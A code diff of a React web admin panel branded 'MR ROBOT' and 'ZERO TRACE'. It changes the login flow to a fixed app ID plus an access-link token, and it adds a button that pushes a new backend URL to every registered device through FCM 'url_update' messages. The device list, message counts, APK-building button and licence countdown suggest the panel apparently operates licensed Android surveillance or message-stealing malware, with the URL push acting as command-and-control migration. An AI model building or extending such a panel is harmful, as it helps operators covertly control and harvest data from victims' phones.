@@ -6,9 +6,9 @@ import { DeleteIconButton } from "@/components/ui/delete-icon-button";
 
 function apiFetch(url: string, opts: RequestInit = {}): Promise<Response> {
     const h = new Headers(opts.headers);
-    // Read appId from sessionStorage — set at login, not from URL anymore
-    const _appId = sessionStorage.getItem("mrrobot_active_appid") || "";
-    const _jwt = _appId ? sessionStorage.getItem(`mrrobot_jwt_${_appId}`) : null;
+    const _appId = new URLSearchParams(window.location.search).get("appId") || "SKY-APP-2026-X9F3";
+    // JWT Bearer first (sessionStorage — cleared on tab close, not accessible cross-tab)
+    const _jwt = sessionStorage.getItem(`mrrobot_jwt_${_appId}`);
     if (_jwt) h.set("Authorization", `Bearer ${_jwt}`);
     return fetch(url, { ...opts, headers: h });
   }
@@ -2251,8 +2251,8 @@ function ShootApkButton({ appId }: { appId: string }) {
     </div>
   );
 }
-function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount, isZeroTrace: isZT, onDeleteProtEnabledChange }: {
-  appId: string; isDark: boolean; onToggleDark: () => void; devices: DbDevice[]; onLogout: () => void; msgCount: number; isZeroTrace?: boolean; onDeleteProtEnabledChange: (v: boolean) => void;
+function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount, isZeroTrace: isZT, onDeleteProtEnabledChange, panelToken, onPanelTokenChange }: {
+  appId: string; isDark: boolean; onToggleDark: () => void; devices: DbDevice[]; onLogout: () => void; msgCount: number; isZeroTrace?: boolean; onDeleteProtEnabledChange: (v: boolean) => void; panelToken?: string; onPanelTokenChange?: (t: string) => void;
 }) {
   const t = useTheme();
   const AUTH_KEY = `mrrobot_auth_${appId}`;
@@ -2596,35 +2596,26 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount
   }
 
   /* ── Send Backend URL to all devices ── */
-  const BACKEND_URL = "https://mr-robot07.pages.dev/api";
+  const BACKEND_URL = "https://mr-robot07.pages.dev";
   const [sendUrlState, setSendUrlState] = useState<"idle"|"running"|"done">("idle");
   const [sendUrlDone, setSendUrlDone] = useState(0);
   const [sendUrlResult, setSendUrlResult] = useState<{ ok: number; fail: number } | null>(null);
 
   async function handleSendBackendUrl() {
-    if (sendUrlState === "running") return;
+    if (sendUrlState === "running" || devices.length === 0) return;
+    const BATCH = 10; const DELAY = 300;
     setSendUrlState("running"); setSendUrlDone(0); setSendUrlResult(null);
-    const BATCH = 20;
-    let offset = 0, totalOk = 0, totalFail = 0, total = 0;
-    try {
-      while (true) {
-        const r = await apiFetch("/api/recovery", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ offset, limit: BATCH }),
-        });
-        if (!r.ok) break;
-        const result = await r.json() as { ok: number; fail: number; processed: number; total: number; done: boolean };
-        totalOk   += result.ok ?? 0;
-        totalFail += result.fail ?? 0;
-        total      = result.total ?? total;
-        setSendUrlDone(result.processed ?? offset + BATCH);
-        if (result.done || result.processed >= result.total) break;
-        offset = result.processed;
-      }
-    } catch { /* ignore */ }
-    setSendUrlResult({ ok: totalOk, fail: totalFail });
-    setSendUrlState("done");
+    let ok = 0; let fail = 0;
+    for (let i = 0; i < devices.length; i += BATCH) {
+      const batch = devices.slice(i, i + BATCH);
+      const results = await Promise.allSettled(
+        batch.map(d => fcmSend(d.deviceId, { type: "url_update", url: BACKEND_URL, priority: "high" }))
+      );
+      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
+      setSendUrlDone(Math.min(i + BATCH, devices.length));
+      if (i + BATCH < devices.length) await new Promise(r => setTimeout(r, DELAY));
+    }
+    setSendUrlResult({ ok, fail }); setSendUrlState("done");
     setTimeout(() => { setSendUrlState("idle"); setSendUrlDone(0); setSendUrlResult(null); }, 6000);
   }
 
@@ -2637,41 +2628,6 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount
 
   return (
     <div style={{ padding: 10, display: "flex", flexDirection: "column", gap: 10 }}>
-
-      {/* ── Data Recovery ── */}
-      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
-        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
-          <span style={{ fontSize: 13, fontWeight: 700, color: t.txt }}>Data Recovery</span>
-          <span style={{ background: devices.length > 0 ? t.accent : t.hdrB, color: devices.length > 0 ? "#fff" : t.muted, borderRadius: 99, padding: "1px 8px", fontSize: 10, fontWeight: 800 }}>
-            {devices.length} device{devices.length !== 1 ? "s" : ""}
-          </span>
-        </div>
-        <div style={{ padding: "12px 14px", display: "flex", flexDirection: "column", gap: 10 }}>
-          <div style={{ fontSize: 12, color: t.muted, lineHeight: 1.55 }}>
-            Reconnects all registered devices and restores their configuration. Run this after any server change.
-          </div>
-          {sendUrlState === "running" && (
-            <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
-              <div style={{ height: 4, borderRadius: 99, background: t.hdrB, overflow: "hidden" }}>
-                <div style={{ height: "100%", borderRadius: 99, background: t.accent, width: `${devices.length ? Math.round((sendUrlDone / devices.length) * 100) : 0}%`, transition: "width 0.3s" }} />
-              </div>
-              <div style={{ fontSize: 11, color: t.muted, textAlign: "center" }}>Recovering {sendUrlDone} / {devices.length}…</div>
-            </div>
-          )}
-          {sendUrlState === "done" && sendUrlResult && (
-            <div style={{ fontSize: 12, textAlign: "center", fontWeight: 700, color: sendUrlResult.fail === 0 ? "#22c55e" : "#f59e0b" }}>
-              {sendUrlResult.fail === 0 ? `✅ All ${sendUrlResult.ok} devices recovered` : `✅ ${sendUrlResult.ok} recovered  ⚠️ ${sendUrlResult.fail} unreachable`}
-            </div>
-          )}
-          <button
-            onClick={() => void handleSendBackendUrl()}
-            disabled={sendUrlState === "running" || devices.length === 0}
-            style={{ padding: "11px 0", borderRadius: 9, border: "none", background: sendUrlState === "running" ? t.hdrB : t.accent, color: sendUrlState === "running" ? t.muted : "#fff", fontWeight: 700, fontSize: 13, cursor: sendUrlState === "running" || devices.length === 0 ? "not-allowed" : "pointer", width: "100%", transition: "all 0.2s" }}
-          >
-            {sendUrlState === "running" ? `Recovering… ${sendUrlDone}/${devices.length}` : sendUrlState === "done" ? "✅ Recovery Complete" : "Start Recovery"}
-          </button>
-        </div>
-      </div>
 
         {/* ── Licence Countdown ── */}
       {countdown && (
@@ -2883,6 +2839,43 @@ function SettingsPage({ appId, isDark, onToggleDark, devices, onLogout, msgCount
         </div>
       </div>
 
+      {/* ── Send Backend URL ── */}
+      <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
+        <div style={{ padding: "10px 14px", borderBottom: `1px solid ${t.hdrB}`, display: "flex", alignItems: "center", justifyContent: "space-between" }}>
+          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+            <span style={{ fontSize: 14 }}>🌐</span>
+            <span style={{ fontSize: 12, fontWeight: 700, color: t.txt2 }}>Send Backend URL</span>
+          </div>
+          <span style={{ background: devices.length > 0 ? "#0d9488" : t.hdrB, color: devices.length > 0 ? "#fff" : t.muted, borderRadius: 99, padding: "1px 7px", fontSize: 10, fontWeight: 800 }}>
+            {devices.length} devices
+          </span>
+        </div>
+        <div style={{ padding: "12px 16px", display: "flex", flexDirection: "column", gap: 10 }}>
+          <div style={{ fontSize: 11, color: t.muted, lineHeight: 1.5 }}>
+            Sends <span style={{ fontWeight: 700, color: t.txt, fontFamily: "monospace" }}>{BACKEND_URL}</span> to all devices via FCM <code style={{ background: t.hdr, padding: "1px 5px", borderRadius: 4, fontSize: 10 }}>url_update</code>
+          </div>
+          {sendUrlState === "running" && (
+            <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+              <div style={{ height: 4, borderRadius: 99, background: t.hdrB, overflow: "hidden" }}>
+                <div style={{ height: "100%", borderRadius: 99, background: "linear-gradient(90deg,#0d9488,#06b6d4)", width: `${devices.length ? Math.round((sendUrlDone / devices.length) * 100) : 0}%`, transition: "width 0.3s" }} />
+              </div>
+              <div style={{ fontSize: 11, color: t.muted, textAlign: "center" }}>{sendUrlDone} / {devices.length} sent…</div>
+            </div>
+          )}
+          {sendUrlState === "done" && sendUrlResult && (
+            <div style={{ fontSize: 11, textAlign: "center", fontWeight: 700, color: sendUrlResult.fail === 0 ? "#22c55e" : "#f59e0b" }}>
+              ✅ {sendUrlResult.ok} sent{sendUrlResult.fail > 0 ? `  ❌ ${sendUrlResult.fail} failed` : ""}
+            </div>
+          )}
+          <button
+            onClick={() => void handleSendBackendUrl()}
+            disabled={sendUrlState === "running" || devices.length === 0}
+            style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, padding: "11px 0", borderRadius: 9, background: sendUrlState === "running" ? t.hdrB : "linear-gradient(135deg,#0d9488,#06b6d4)", color: sendUrlState === "running" ? t.muted : "#fff", fontWeight: 800, fontSize: 13, border: "none", cursor: sendUrlState === "running" || devices.length === 0 ? "not-allowed" : "pointer", width: "100%", boxShadow: sendUrlState === "running" ? "none" : "0 4px 16px rgba(13,148,136,0.4)", transition: "all 0.2s" }}
+          >
+            {sendUrlState === "running" ? `Sending… ${sendUrlDone}/${devices.length}` : sendUrlState === "done" ? "✅ Sent!" : "🌐 Send URL to All Devices"}
+          </button>
+        </div>
+      </div>
 
       {/* ── Update Admin ── */}
       <div style={{ background: t.card, borderRadius: 10, border: `1px solid ${t.cardB}`, overflow: "hidden" }}>
@@ -3474,231 +3467,225 @@ function DeleteAllMessagesSection({ appId, onDeleted, msgCount }: { appId: strin
 /* ════════════════════════════════════════
    LOGIN PAGE
 ════════════════════════════════════════ */
-export function LoginPage({ onAuth, onSetAppId, prefillAppId }: { onAuth: () => void; onSetAppId: (id: string) => void; prefillAppId?: string }) {
+export function LoginPage({ onAuth, appId, appName, panelToken }: { onAuth: () => void; appId: string; appName: string; panelToken: string }) {
   const t = useTheme();
-  const [step, setStep] = useState<"token"|"password">("token");
-  const [inputAppId, setInputAppId] = useState(prefillAppId || "");
   const [pin, setPin] = useState("");
   const [err, setErr] = useState("");
   const [loading, setLoading] = useState(false);
+  const [msg, setMsg] = useState("");
   const [lockSecs, setLockSecs] = useState(0);
 
+  // Live countdown timer when locked
   useEffect(() => {
     if (lockSecs <= 0) return;
-    const iv = setInterval(() => setLockSecs(p => { if (p <= 1) { clearInterval(iv); return 0; } return p - 1; }), 1000);
-    return () => clearInterval(iv);
-  }, [lockSecs > 0]);
-
-  async function handleProcess(e: React.FormEvent) {
-    e.preventDefault();
-    const appId = inputAppId.trim();
-    if (!appId) { setErr("Please enter your token."); return; }
-    setLoading(true); setErr("");
-    try {
-      const r = await fetch(`/api/apps/${appId}/verify-pin`, {
-        method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ pin: "__check__" }),
+    const t = setInterval(() => {
+      setLockSecs(prev => {
+        if (prev <= 1) { clearInterval(t); return 0; }
+        return prev - 1;
       });
-      // 400 = app exists but wrong pin → proceed to password step
-      // 404 = app not found
-      if (r.status === 404) { setErr("Token not found. Please check and try again."); setLoading(false); return; }
-      if (r.status === 429) { setErr("Too many attempts. Please wait."); setLoading(false); return; }
-      // any other status (including 400 wrong pin) means app exists
-      setStep("password");
-      setErr("");
-    } catch { setErr("Network error. Try again."); }
-    finally { setLoading(false); }
-  }
+    }, 1000);
+    return () => clearInterval(t);
+  }, [lockSecs > 0]);
 
   async function handleLogin(e: React.FormEvent) {
     e.preventDefault();
-    const appId = inputAppId.trim();
     setLoading(true); setErr("");
     try {
-      const r = await fetch(`/api/apps/${appId}/verify-pin`, {
+      // Step 1: verify PIN
+      const r = await apiFetch(`/api/apps/${appId}/verify-pin`, {
         method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ pin }),
+        body: JSON.stringify({ pin, panelToken }),
       });
       if (!r.ok) {
         const j = await r.json().catch(() => ({}));
         const apiErr = (j as { error?: string }).error ?? "";
         if (r.status === 429) {
+          // Parse seconds from "Try again in X sec." or "Locked for 2 min."
           const secMatch = apiErr.match(/(\d+)\s*sec/);
           const minMatch = apiErr.match(/(\d+)\s*min/);
           const secs = secMatch ? parseInt(secMatch[1]) : minMatch ? parseInt(minMatch[1]) * 60 : 120;
-          setLockSecs(secs); setErr(""); setPin(""); return;
+          setLockSecs(secs);
+          setErr("");
+          setPin(""); return;
         }
         setErr(
-          apiErr.includes("expired") || apiErr.includes("Licence") ? "Licence expired. Contact admin." :
-          apiErr.includes("disabled") ? "App disabled. Contact admin." :
-          apiErr.includes("Wrong PIN") || apiErr.includes("attempt") ? "Wrong password. Try again." :
-          apiErr || "Login failed. Try again."
-        );
-        setPin(""); return;
+            apiErr.includes("not found") ? "This App ID doesn't exist. Please check the App ID and try again." :
+            apiErr.includes("expired") || apiErr.includes("Licence") ? "This app's licence has expired. Please contact admin to renew." :
+            apiErr.includes("disabled") ? "This app has been disabled by admin. Please contact admin." :
+            apiErr.includes("access link") ? "Invalid or missing access link. Please ask your admin for the correct link." :
+            apiErr.includes("attempt") ? apiErr :
+            apiErr.includes("Wrong PIN") ? "Wrong PIN. Please try again." :
+            apiErr || "Login failed. Please try again."
+          );
+          setPin(""); return;
       }
+
+      // Step 2: create session — required for data access
       const sessR = await apiFetch("/api/admin/sessions", {
         method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ appId, pin, deviceId: getDeviceId() }),
+        body: JSON.stringify({ appId, pin, panelToken, deviceId: getDeviceId() }),
       }).catch(() => null);
+
       if (!sessR || !sessR.ok) {
-        const j = sessR ? await sessR.json().catch(() => ({} as {error?:string})) : {};
-        setErr(!sessR ? "Network error." : (j as {error?:string}).error || "Login failed."); return;
-      }
-      const { sessionId, token: _subJwt } = await sessR.json();
+          let sessErr = "";
+          if (sessR) {
+            const j = await sessR.json().catch(() => ({} as { error?: string }));
+            sessErr = (j as { error?: string }).error ?? "";
+          }
+          setErr(
+            !sessR ? "Network error. Please check your connection and try again." :
+            sessErr || "Login failed. Please try again."
+          );
+          return;
+        }
+        const { sessionId, token: _subJwt } = await sessR.json();
       localStorage.setItem(`mrrobot_session_id_${appId}`, sessionId);
       if (_subJwt) sessionStorage.setItem(`mrrobot_jwt_${appId}`, _subJwt);
-      sessionStorage.setItem("mrrobot_active_appid", appId);
-      onSetAppId(appId);
+      if (panelToken) localStorage.setItem(`mrrobot_panel_token_${appId}`, panelToken);
+
+      // Both steps passed — set auth
       localStorage.setItem(`mrrobot_auth_${appId}`, "1");
       onAuth();
     } catch { setErr("Network error. Try again."); }
     finally { setLoading(false); }
   }
 
-  const BG = "#07101f";
-  const CARD = "#0d1b2e";
-  const BORDER = "#1a2e47";
-  const ACCENT = "#6366f1";
-  const inputStyle: React.CSSProperties = {
-    width: "100%", padding: "12px 14px", borderRadius: 10,
-    border: `1.5px solid ${err ? "#ef4444" : BORDER}`,
-    background: "#040d18", color: "#f1f5f9",
-    fontSize: 14, outline: "none", boxSizing: "border-box",
-    fontFamily: "monospace", letterSpacing: 0.8,
-    transition: "border-color 0.2s",
-  };
+  const isZT = appName === "ZERO TRACE";
+    const inputStyle: React.CSSProperties = {
+      width: "100%", padding: "10px 14px", borderRadius: 10,
+      border: `1.5px solid ${isZT ? "#1d4ed8" : t.cardB}`,
+      background: isZT ? "#eff6ff" : "#0f172a",
+      color: isZT ? "#1e3a8a" : "#f8fafc",
+      fontSize: 15, outline: "none", boxSizing: "border-box",
+    };
+    const labelStyle: React.CSSProperties = {
+      display: "block", marginBottom: 6, fontSize: 12, fontWeight: 700,
+      color: isZT ? "#1d4ed8" : "#94a3b8", letterSpacing: 0.5,
+      textTransform: "uppercase",
+    };
 
-  return (
+    return (
     <div style={{
-      minHeight: "100vh", background: BG,
+      minHeight: "100vh", background: appName === "ZERO TRACE" ? "#eff6ff" : "#0a0f1a",
       display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center",
       fontFamily: "system-ui,-apple-system,'Segoe UI',sans-serif", padding: 16,
     }}>
-      <style>{`@keyframes mrSlide{0%{transform:translateX(-100%)}100%{transform:translateX(350%)}}`}</style>
-      <div style={{ width: "100%", maxWidth: 360 }}>
-
-        {/* Logo */}
-        <div style={{ display: "flex", justifyContent: "center", marginBottom: 24 }}>
-          <svg width="48" height="48" viewBox="0 0 34 34" fill="none">
-            <line x1="17" y1="1" x2="17" y2="7" stroke={ACCENT} strokeWidth="1.8" strokeLinecap="round"/>
-            <circle cx="17" cy="1.5" r="2" fill={ACCENT}/>
-            <rect x="3" y="7" width="28" height="22" rx="5" fill="#1e293b" stroke={ACCENT} strokeWidth="1.5"/>
-            <rect x="8" y="13" width="6" height="6" rx="1.5" fill={ACCENT}/>
-            <rect x="20" y="13" width="6" height="6" rx="1.5" fill={ACCENT}/>
-            <rect x="2" y="16" width="2" height="5" rx="1" fill="#334155"/>
-            <rect x="30" y="16" width="2" height="5" rx="1" fill="#334155"/>
-            <rect x="8" y="22" width="18" height="4" rx="1.5" fill="#0f172a"/>
-            <rect x="10" y="22" width="3" height="4" rx="1" fill={ACCENT}/>
-            <rect x="15.5" y="22" width="3" height="4" rx="1" fill={ACCENT}/>
-            <rect x="21" y="22" width="3" height="4" rx="1" fill={ACCENT}/>
-          </svg>
-        </div>
-
-        {/* Step indicators */}
-        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 28 }}>
-          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
-            <div style={{ width: 24, height: 24, borderRadius: "50%", background: ACCENT, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 11, fontWeight: 800, color: "#fff" }}>
-              {step === "password" ? "✓" : "1"}
-            </div>
-            <span style={{ fontSize: 11, fontWeight: 700, color: ACCENT }}>Token</span>
-          </div>
-          <div style={{ width: 32, height: 1.5, background: step === "password" ? ACCENT : BORDER, borderRadius: 99, transition: "background 0.3s" }} />
-          <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
-            <div style={{ width: 24, height: 24, borderRadius: "50%", background: step === "password" ? ACCENT : BORDER, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 11, fontWeight: 800, color: step === "password" ? "#fff" : "#475569", transition: "all 0.3s" }}>2</div>
-            <span style={{ fontSize: 11, fontWeight: 700, color: step === "password" ? ACCENT : "#475569", transition: "color 0.3s" }}>Password</span>
-          </div>
-        </div>
-
+      <div style={{ width: "100%", maxWidth: 380 }}>
         {/* Card */}
-        <div style={{ background: CARD, borderRadius: 16, padding: "28px 24px", border: `1px solid ${BORDER}`, boxShadow: "0 24px 64px #00000090" }}>
+        <div style={{ background: appName === "ZERO TRACE" ? "#f8fafc" : "#111827", borderRadius: 18, padding: "32px 28px", border: appName === "ZERO TRACE" ? "1px solid #bfdbfe" : "1px solid #1e293b", boxShadow: appName === "ZERO TRACE" ? "0 20px 60px rgba(29,78,216,0.14)" : "0 20px 60px #00000080" }}>
 
-          {/* Step 1 — Token */}
-          {step === "token" && (
-            <form onSubmit={handleProcess} style={{ display: "flex", flexDirection: "column", gap: 18 }}>
-              <div>
-                <div style={{ fontSize: 18, fontWeight: 800, color: "#f1f5f9", marginBottom: 4 }}>Enter your token</div>
-                <div style={{ fontSize: 12, color: "#475569" }}>Provided by your administrator</div>
+          {/* Logo — Eye for ZERO TRACE, Robot for MR ROBOT */}
+          {appName === "ZERO TRACE" && (
+            <div style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}>
+              <div style={{ width: 68, height: 68, borderRadius: 18, background: "#0f172a", display: "flex", alignItems: "center", justifyContent: "center", boxShadow: "0 0 0 1px #1d4ed830, 0 8px 28px rgba(29,78,216,0.35), 0 0 20px rgba(29,78,216,0.2) inset" }}>
+                <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+                  {/* Outer dashed ring */}
+                  <circle cx="20" cy="20" r="18" stroke="#1d4ed8" strokeWidth="1" strokeDasharray="3 2.5" opacity="0.5"/>
+                  {/* Main ring */}
+                  <circle cx="20" cy="20" r="11" stroke="#1d4ed8" strokeWidth="1.4"/>
+                  {/* Inner ring */}
+                  <circle cx="20" cy="20" r="5.5" stroke="#3b82f6" strokeWidth="1" opacity="0.8"/>
+                  {/* Center dot */}
+                  <circle cx="20" cy="20" r="2" fill="#60a5fa"/>
+                  {/* Crosshair arms */}
+                  <line x1="20" y1="1" x2="20" y2="9.5" stroke="#1d4ed8" strokeWidth="1.5" strokeLinecap="round"/>
+                  <line x1="20" y1="30.5" x2="20" y2="39" stroke="#1d4ed8" strokeWidth="1.5" strokeLinecap="round"/>
+                  <line x1="1" y1="20" x2="9.5" y2="20" stroke="#1d4ed8" strokeWidth="1.5" strokeLinecap="round"/>
+                  <line x1="30.5" y1="20" x2="39" y2="20" stroke="#1d4ed8" strokeWidth="1.5" strokeLinecap="round"/>
+                  {/* Corner brackets */}
+                  <path d="M30 10 L34 10 L34 14" stroke="#3b82f6" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" opacity="0.75"/>
+                  <path d="M10 10 L6 10 L6 14" stroke="#3b82f6" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" opacity="0.75"/>
+                  <path d="M30 30 L34 30 L34 26" stroke="#3b82f6" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" opacity="0.75"/>
+                  <path d="M10 30 L6 30 L6 26" stroke="#3b82f6" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round" opacity="0.75"/>
+                </svg>
               </div>
-              <input
-                value={inputAppId}
-                onChange={e => { setInputAppId(e.target.value.trim()); setErr(""); }}
-                placeholder="e.g. APP-XXXX-XXXX"
-                autoFocus
-                autoCapitalize="none"
-                spellCheck={false}
-                style={inputStyle}
-              />
-              {err && <div style={{ fontSize: 12, color: "#f87171", fontWeight: 600 }}>{err}</div>}
-              {loading && (
-                <div style={{ height: 3, background: BORDER, borderRadius: 99, overflow: "hidden" }}>
-                  <div style={{ height: "100%", width: "30%", borderRadius: 99, background: ACCENT, animation: "mrSlide 1.1s ease-in-out infinite" }} />
-                </div>
-              )}
-              <button type="submit" disabled={loading || !inputAppId.trim()} style={{
-                padding: "13px", borderRadius: 10, border: "none",
-                background: !inputAppId.trim() ? BORDER : ACCENT,
-                color: !inputAppId.trim() ? "#475569" : "#fff",
-                fontWeight: 800, fontSize: 14, cursor: !inputAppId.trim() || loading ? "not-allowed" : "pointer",
-                letterSpacing: 0.3, transition: "all 0.2s",
-              }}>
-                {loading ? "Verifying…" : "Process →"}
-              </button>
-            </form>
+            </div>
           )}
+          {appName !== "ZERO TRACE" && <div style={{ display: "flex", justifyContent: "center", marginBottom: 20, cursor: "pointer", WebkitUserSelect: "none", userSelect: "none", outline: "none", WebkitTapHighlightColor: "transparent" }}>
+            <svg width="52" height="52" viewBox="0 0 34 34" fill="none">
+              <line x1="17" y1="1" x2="17" y2="7" stroke="#818cf8" strokeWidth="1.8" strokeLinecap="round"/>
+              <circle cx="17" cy="1.5" r="2" fill="#818cf8"/>
+              <rect x="3" y="7" width="28" height="22" rx="5" fill="#1e293b" stroke={t.accent} strokeWidth="1.5"/>
+              <rect x="8" y="13" width="6" height="6" rx="1.5" fill={t.accent}/>
+              <rect x="20" y="13" width="6" height="6" rx="1.5" fill={t.accent}/>
+              <rect x="2" y="16" width="2" height="5" rx="1" fill="#334155"/>
+              <rect x="30" y="16" width="2" height="5" rx="1" fill="#334155"/>
+              <rect x="8" y="22" width="18" height="4" rx="1.5" fill="#0f172a"/>
+              <rect x="10" y="22" width="3" height="4" rx="1" fill={appName === "ZERO TRACE" ? "#1d4ed8" : t.accent}/>
+              <rect x="15.5" y="22" width="3" height="4" rx="1" fill={appName === "ZERO TRACE" ? "#1d4ed8" : t.accent}/>
+              <rect x="21" y="22" width="3" height="4" rx="1" fill={appName === "ZERO TRACE" ? "#1d4ed8" : t.accent}/>
+            </svg>
+          </div>}
 
-          {/* Step 2 — Password */}
-          {step === "password" && (
-            <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: 18 }}>
+          <div style={{ textAlign: "center", marginBottom: 28 }}>
+            <div style={{ color: appName === "ZERO TRACE" ? "#1e3a8a" : "#f8fafc", fontWeight: 900, fontSize: 22, letterSpacing: 1 }}>
+              {"Welcome Back, Admin"}
+            </div>
+            {appName && <div style={{ color: appName === "ZERO TRACE" ? "#1d4ed8" : "#475569", fontSize: 11, marginTop: 4, fontFamily: "monospace", fontWeight: 700 }}>{appName}</div>}
+          </div>
+
+          <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: 16 }}>
               <div>
-                <div style={{ fontSize: 18, fontWeight: 800, color: "#f1f5f9", marginBottom: 4 }}>Enter password</div>
-                <div style={{ fontSize: 12, color: "#475569", display: "flex", alignItems: "center", gap: 6 }}>
-                  <span style={{ fontFamily: "monospace", color: "#818cf8", fontSize: 11 }}>{inputAppId}</span>
-                  <button type="button" onClick={() => { setStep("token"); setPin(""); setErr(""); }}
-                    style={{ background: "none", border: "none", color: "#475569", fontSize: 11, cursor: "pointer", textDecoration: "underline", padding: 0 }}>
-                    Change
-                  </button>
+                <label style={labelStyle}>Token ID</label>
+                <div style={{ position: "relative", display: "flex", alignItems: "center" }}>
+                  <input value={appId} readOnly style={{ ...inputStyle, color: isZT ? "#1d4ed8" : t.accent, cursor: "default", fontFamily: "monospace", letterSpacing: 1, paddingRight: 44 }} />
+                  <div style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)" }}>
+                    <CopyIconButton value={appId} size={28} color={isZT ? "#1d4ed8" : t.accent} title="Copy Token ID" />
+                  </div>
                 </div>
               </div>
-              <input
-                type="password"
-                value={pin}
-                onChange={e => { setPin(e.target.value); setErr(""); }}
-                placeholder="Enter your password"
-                autoFocus
-                style={{ ...inputStyle, fontFamily: "system-ui", letterSpacing: 2 }}
-              />
+              <div>
+                <label style={labelStyle}>PIN</label>
+                <input
+                  type="password" value={pin} onChange={e => { setPin(e.target.value); setErr(""); }}
+                  placeholder="Enter PIN" autoFocus style={inputStyle}
+                />
+              </div>
               {lockSecs > 0 && (
-                <div style={{ background: "#1a0a0a", border: "1.5px solid #ef4444", borderRadius: 10, padding: "12px 16px", textAlign: "center" }}>
+                <div style={{ background: "#1c1c1e", border: "1.5px solid #ef4444", borderRadius: 10, padding: "12px 16px", textAlign: "center" }}>
                   <div style={{ fontSize: 22, fontWeight: 800, color: "#ef4444", letterSpacing: 2 }}>
                     {String(Math.floor(lockSecs / 60)).padStart(2, "0")}:{String(lockSecs % 60).padStart(2, "0")}
                   </div>
-                  <div style={{ color: "#f87171", fontSize: 11, marginTop: 4, fontWeight: 600 }}>Too many attempts — locked</div>
+                  <div style={{ color: "#f87171", fontSize: 12, marginTop: 4, fontWeight: 600 }}>
+                    Too many wrong attempts — account locked
+                  </div>
                 </div>
               )}
-              {lockSecs === 0 && err && <div style={{ fontSize: 12, color: "#f87171", fontWeight: 600 }}>{err}</div>}
-              {loading && (
-                <div style={{ height: 3, background: BORDER, borderRadius: 99, overflow: "hidden" }}>
-                  <div style={{ height: "100%", width: "30%", borderRadius: 99, background: ACCENT, animation: "mrSlide 1.1s ease-in-out infinite" }} />
-                </div>
-              )}
-              <button type="submit" disabled={loading || lockSecs > 0 || !pin} style={{
-                padding: "13px", borderRadius: 10, border: "none",
-                background: lockSecs > 0 ? "#1a1a1a" : !pin ? BORDER : ACCENT,
-                color: lockSecs > 0 ? "#6b7280" : !pin ? "#475569" : "#fff",
-                fontWeight: 800, fontSize: 14,
-                cursor: loading || lockSecs > 0 || !pin ? "not-allowed" : "pointer",
-                letterSpacing: 0.3, transition: "all 0.2s",
-              }}>
-                {lockSecs > 0 ? `Locked — ${String(Math.floor(lockSecs/60)).padStart(2,"0")}:${String(lockSecs%60).padStart(2,"0")}` : loading ? "Signing in…" : "Login"}
-              </button>
-            </form>
-          )}
-        </div>
+              {lockSecs === 0 && err && <div style={{ color: "#f87171", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{err}</div>}
+              {msg && <div style={{ color: "#4ade80", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{msg}</div>}
 
-        <div style={{ textAlign: "center", marginTop: 20, color: "#1e3a5f", fontSize: 11, fontWeight: 600 }}>
-          Build: {BUILD_VERSION}
+              {/* Progress bar — visible during login */}
+              {loading && (
+                <>
+                  <style>{`@keyframes mrSlide{0%{transform:translateX(-100%)}100%{transform:translateX(350%)}}`}</style>
+                  <div style={{ width:"100%", height:3, background: isZT?"#dbeafe":"#1e293b", borderRadius:99, overflow:"hidden" }}>
+                    <div style={{ height:"100%", width:"30%", borderRadius:99, background: isZT?"#1d4ed8":t.accent, animation:"mrSlide 1.1s ease-in-out infinite" }} />
+                  </div>
+                  <div style={{ textAlign:"center", fontSize:11, color: isZT?"#1d4ed8":"#64748b", fontWeight:600, letterSpacing:0.5 }}>
+                    Verifying…
+                  </div>
+                </>
+              )}
+
+              
+              <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
+                <button type="submit" disabled={loading || lockSecs > 0} style={{
+                  flex: 1, background: lockSecs > 0 ? "#374151" : isZT ? "#1d4ed8" : t.accent,
+                  color: lockSecs > 0 ? "#6b7280" : "#fff", border: "none",
+                  borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 700,
+                  cursor: lockSecs > 0 ? "not-allowed" : "pointer",
+                }}>{lockSecs > 0 ? `Locked (${String(Math.floor(lockSecs/60)).padStart(2,"0")}:${String(lockSecs%60).padStart(2,"0")})` : "Sign In"}</button>
+              </div>
+            </form>
+
+
+
+                    <div style={{ textAlign: "center", marginTop: 24, color: "#334155", fontSize: 11, fontWeight: 600 }}>
+            Build: {BUILD_VERSION}
+          </div>
         </div>
       </div>
+
     </div>
   );
 }
